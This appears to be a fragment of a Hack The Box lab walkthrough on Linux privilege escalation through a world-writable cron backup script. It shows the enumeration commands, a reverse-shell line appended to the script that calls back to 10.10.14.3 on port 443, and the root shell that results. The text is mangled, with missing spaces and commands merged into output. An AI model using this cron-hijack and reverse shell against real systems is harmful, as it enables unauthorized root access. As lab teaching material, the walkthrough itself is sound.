...
```
icantthinkofaname23@htb[/htb]`$find/ -path /proc -prune -o -type f -perm -o+w2>/dev/null/etc/cron.daily/backup
...
```
icantthinkofaname23@htb[/htb]`$ls-la /dmz-backups/total 36
...
```
icantthinkofaname23@htb[/htb]`$./pspy64 -pf -i1000pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
...
```
icantthinkofaname23@htb[/htb]`$cat/dmz-backups/backup.sh#!/bin/bashSRCDIR="/var/www/html"
 DESTDIR="/dmz-backups/"FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date+%-T).tgztar --absolute-names --create --gzip --file=$DESTDIR$FILENAME$SRCDIR`
```
...
Code:bash```
`#!/bin/bashSRCDIR="/var/www/html"DESTDIR="/dmz-backups/"FILENAME=www-backup-$(date+%-Y%-m%-d)-$(date+%-T).tgztar--absolute-names --create --gzip --file=$DESTDIR$FILENAME$SRCDIRbash-i>&/dev/tcp/10.10.14.3/4430>&1`
```
...
bash: no job control in this shellroot@NIX02:~#idid
uid=0(root) gid=0(root) groups=0(root)root@NIX02:~#hostnamehostname
NIX02`
```
